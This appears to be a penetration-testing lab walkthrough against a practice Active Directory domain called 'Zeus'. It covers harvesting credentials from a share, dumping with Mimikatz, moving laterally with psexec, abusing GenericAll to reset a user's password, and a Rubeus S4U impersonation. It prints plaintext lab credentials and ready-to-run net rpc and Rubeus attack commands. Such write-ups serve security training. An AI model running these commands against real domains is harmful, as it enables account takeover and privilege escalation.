# Zeus

On 192.168.214.159 share SQL

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

get conection.sql to find credentials zeus.corp\db\_user:Password123!

on .159 we are admin with the given credentials. Dump with mimi and get o.foller:EarlyMorningFootball777.

Enter on .160 with this credentials using psexec.

Whe found a document inside z.thomas folders with is credentials ^1+>pdRLwyct]j,CYmyi

he has generic all on d.chambers. Change her password

{% code overflow="wrap" %}
```
net rpc password "d.chambers" "Password123" -U "zeus.corp"/"z.thomas"%'^1+>pdRLwyct]j,CYmyi' -S "192.168.214.158"
```
{% endcode %}



{% code overflow="wrap" %}
```
Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/dc02.sub.poseidon.yzx /ptt
```
{% endcode %}



